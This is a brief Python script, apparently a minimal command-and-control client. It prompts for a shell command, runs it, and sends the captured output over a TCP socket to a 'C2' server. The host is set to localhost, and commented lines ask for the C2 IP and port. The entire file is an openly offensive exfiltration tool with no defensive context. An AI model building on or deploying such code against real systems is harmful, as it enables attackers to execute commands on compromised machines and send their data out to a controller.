#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import base64

# Initialize remote host variables with user input
#RHOST = str(input("C2 IP Address\n" ))
RHOST = '127.0.0.1'
#RPORT = int(input("C2 Port\n"))
RPORT = 7001
RSERVER = (RHOST, RPORT)

# Run command
CMD = input("What is your command\n")
CMDARG = str(CMD).split(" ")
execute = subprocess.run(CMDARG, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
DATA = execute.stdout

# Connect out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(RSERVER)
s.sendall(bytes(DATA, "utf-8"))